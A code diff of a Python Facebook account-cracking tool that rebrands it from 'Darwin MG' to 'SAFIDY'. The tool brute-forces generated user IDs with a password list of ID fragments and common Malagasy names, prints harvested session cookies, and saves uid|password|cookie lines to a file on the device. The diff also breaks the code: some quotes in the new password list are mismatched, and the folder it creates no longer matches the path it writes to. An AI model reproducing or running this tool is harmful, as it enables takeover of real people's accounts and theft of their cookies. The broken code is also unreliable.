@@ -1,5 +1,5 @@
 # Définir le numéro de version
-version_actuelle = "6.0"
+version_actuelle = "2.0"
 
 
 
@@ -66,12 +66,12 @@ logo=(f'''{B}
                                             
 
 {warna}--------------------------------------------{B}
- Owner    : {M}Darwin{M}
- TOOL NAME : {warna}{P}Darwin MG{P}{warna}
+ Owner    : {M}SAFIDINIAINA{M}
+ TOOL NAME : {warna}{P}SAFIDY{P}{warna}
  GROUPE-FB   : NONE
  STATUE : {H}PAID{H}
- Facebook : {bblue}DARWIN MDG{bblue}
- Tools    : {warna}[{M}VERSION 6.0{warna}]{warna}
+ Facebook : {bblue}SM{bblue}
+ Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],ids[:3],'felana','Felana','miangoty','Miangoty','fiderana', 'Fiderana', 'fitiavana', 'Fitiavana', 'bakoly', 'Bakoly', 'maholy', 'Maholy', 'fanilo', 'Fanilo', 'amboara', 'Amboara', 'miangaly', 'Miangaly','miangola','Miangola','sahondra','Sahondra','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','mandresy','Mandresy','andriatsitohaina','Andriatsitohaina','sarobidy','Sarobidy','lalaina','Lafatra','lalatiana','Lalatiana','lalaina','Lalaina']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','domoina','Domoina','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina,'Andriatsitohaina,'lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
@@ -153,7 +153,7 @@ def method_crack(ids, passlist):
                     print('\033[1;32m [COOKIES] '+coki)
                     # Vérifier si le dossier DARWIN-IDS existe et le créer si nécessaire
                     if not os.path.exists("/sdcard/DARWIN-IDS"):
-                        os.makedirs("/sdcard/DARWIN-IDS")
+                        os.makedirs("/sdcard/SAFIDY-IDS")
                     # Enregistrer dans le fichier DARWIN-OK.txt
                     with open(os.path.join("/sdcard/DARWIN-IDS", "DARWIN-OK.txt"), 'a') as f:
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
